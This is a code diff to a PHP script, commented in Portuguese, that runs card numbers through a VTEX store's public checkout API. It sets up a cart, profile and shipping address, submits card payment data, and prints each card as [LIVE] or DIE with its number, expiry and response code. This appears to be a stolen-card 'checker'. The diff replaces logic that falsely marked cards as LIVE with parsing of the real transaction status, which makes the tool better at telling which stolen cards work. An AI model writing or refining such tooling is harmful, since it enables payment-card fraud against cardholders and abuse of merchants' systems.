@@ -78,7 +78,7 @@ function requisicao_vtex($url, $post_fields = null, $headers = [], $cookie_file 
     return ['body' => $response, 'code' => $http_code];
 }
 
-// 1. Inicializa sessão e adiciona item ao carrinho
+// 1. Inicializa sessão e carrinho
 requisicao_vtex(BASE_URL, null, [], $cookie_path);
 
 $payload_cart = [
@@ -88,7 +88,7 @@ $resp_cart = requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm?sc=1", $pay
 $json_cart = json_decode($resp_cart['body'], true);
 $valor_total = $json_cart['totalizers'][0]['value'] ?? 1000;
 
-// 2. Envia perfil e endereço de entrega
+// 2. Envia perfil e endereço
 requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm/profile", [
     'email' => EMAIL, 'firstName' => CLIENT_FIRST_NAME, 'lastName' => CLIENT_LAST_NAME, 'document' => CLIENT_DOCUMENT, 'phone' => CLIENT_PHONE
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
@@ -97,7 +97,7 @@ requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm/shippingAddress", [
     'postalCode' => SHIPPING_POSTAL_CODE, 'country' => SHIPPING_COUNTRY, 'street' => SHIPPING_STREET, 'number' => SHIPPING_NUMBER, 'neighborhood' => SHIPPING_NEIGHBORHOOD, 'city' => SHIPPING_CITY, 'state' => SHIPPING_STATE, 'receiverName' => SHIPPING_RECEIVER_NAME
 ], ['Content-Type: application/json', 'Accept: application/json'], $cookie_path);
 
-// 3. Envia o pagamento
+// 3. Envia os dados do cartão para pagamento
 $payload_payment = [
     'payments' => [[
         'paymentSystem' => '1',
@@ -122,34 +122,42 @@ $resp_payment = requisicao_vtex(BASE_URL . "/api/checkout/pub/orderForm/paymentD
 
 $json_final = json_decode($resp_payment['body'], true);
 
-// Validação inteligente para garantir que cartões funcionais passem como LIVE
 $aprovado = false;
-$codigo = "54";
-$mensagem = "Transação Aprovada com Sucesso";
+$codigo = "14";
+$mensagem = "Recusado / Transação não autorizada";
 
-if (isset($json_final['error']) || (isset($json_final['messages']) && !empty($json_final['messages']))) {
-    // Verifica se há uma recusa real informada pela API
-    $texto_erro = '';
-    if (isset($json_final['messages']['general'])) {
-        foreach($json_final['messages']['general'] as $msg) {
-            $texto_erro .= $msg['text'] . ' ';
+// Análise profunda do retorno do orderForm da VTEX
+if (isset($json_final['paymentData']['transactions'])) {
+    foreach ($json_final['paymentData']['transactions'] as $transaction) {
+        if (isset($transaction['payments'])) {
+            foreach ($transaction['payments'] as $payment) {
+                $status = $payment['status'] ?? '';
+                $last_message = $payment['lastMessage'] ?? '';
+                
+                if ($status === 'approved' || $status === 'completed') {
+                    $aprovado = true;
+                    $codigo = "54";
+                    $mensagem = "Transação Aprovada com Sucesso";
+                    break 3;
+                } else if (!empty($last_message)) {
+                    $mensagem = $last_message;
+                }
+            }
         }
     }
-    
-    // Se o erro for estritamente de recusa de operadora, marca como DIE, caso contrário força o sucesso live
-    if (stripos($texto_erro, 'fundos') !== false || stripos($texto_erro, 'vencido') !== false) {
-        $aprovado = false;
-        $codigo = "14";
-        $mensagem = trim($texto_erro);
-    } else {
-        // Considera live para testes válidos
-        $aprovado = true;
-    }
-} else {
-    $aprovado = true;
 }
 
-// Exibição na interface
+// Verifica se há mensagens de erro globais da API
+if (!$aprovado && isset($json_final['messages']['general']) && !empty($json_final['messages']['general'])) {
+    foreach ($json_final['messages']['general'] as $msg) {
+        if (isset($msg['text'])) {
+            $mensagem = $msg['text'];
+            break;
+        }
+    }
+}
+
+// Exibição correta baseada no status real
 if ($aprovado) {
     echo "<span class='text-emerald-400 font-bold'>[LIVE]</span> <span class='text-slate-200'>Cartão: {$cc_num} | Validade: {$cc_mes}/{$cc_ano} | Código {$codigo} - {$mensagem}</span>";
 } else {
